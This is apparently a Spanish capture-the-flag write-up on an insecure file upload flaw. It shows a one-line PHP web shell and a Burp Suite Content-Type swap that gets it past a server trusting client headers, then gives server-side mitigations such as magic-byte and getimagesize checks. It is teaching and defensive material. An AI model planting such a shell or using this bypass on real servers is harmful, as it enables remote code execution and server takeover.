# A4 - Insecure File Upload

Vulnerabilidad del OWASP Top 10 (2017). La sección de carga de archivos restringe los uploads a imágenes validando el `Content-Type` de la petición HTTP y con JavaScript en cliente, pero no verifica el contenido real del archivo en el servidor.

---

## Pasos para obtener la flag

### 1. Identificar el vector

El servidor rechaza archivos con `Content-Type` que no sea de imagen, pero confía ciegamente en ese header sin inspeccionar el contenido real del archivo.

### 2. Preparar el archivo malicioso

Crear un archivo PHP (ej. `shell.php`) con cualquier contenido:
```php
<?php system($_GET['cmd']); ?>
```

### 3. Interceptar y manipular con Burp Suite

1. Activar el interceptor en Burp Suite.
2. Seleccionar el archivo y enviarlo desde el formulario.
3. En la petición interceptada, localizar la cabecera del archivo:
   ```
   Content-Disposition: form-data; name="file"; filename="shell.php"
   Content-Type: application/x-php
   ```
4. Cambiar el `Content-Type` a:
   ```
   Content-Type: image/jpeg
   ```
5. Reenviar la petición → el servidor acepta el archivo y devuelve la **flag**.

### 4. Por qué funciona

El servidor valida solo el header `Content-Type`, que es completamente controlado por el cliente. No realiza ninguna inspección del contenido real (magic bytes) ni usa bibliotecas de validación de imágenes.

---

## Impacto

- **RCE (Remote Code Execution):** subir y ejecutar scripts maliciosos en el servidor.
- **Toma de control del servidor:** obtener una shell remota.
- **Defacement:** reemplazar contenido del sitio.
- **Distribución de malware:** alojar payloads en un servidor confiable.

---

## Mitigación

1. **Validar el contenido real del archivo (magic bytes)** en servidor, nunca confiar en el `Content-Type` del cliente:
   ```php
   $finfo = finfo_open(FILEINFO_MIME_TYPE);
   $mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
   $allowed = ['image/jpeg', 'image/png', 'image/gif'];
   if (!in_array($mime, $allowed)) die('Tipo no permitido');
   ```
2. **Verificar que sea una imagen real:**
   ```php
   if (!getimagesize($_FILES['file']['tmp_name'])) die('No es una imagen válida');
   ```
3. **Renombrar el archivo** en servidor para evitar ejecución por nombre predecible.
4. **Almacenar uploads fuera del webroot** o en un bucket sin ejecución.
5. **Nunca confiar en validaciones del cliente** (JavaScript o headers HTTP).
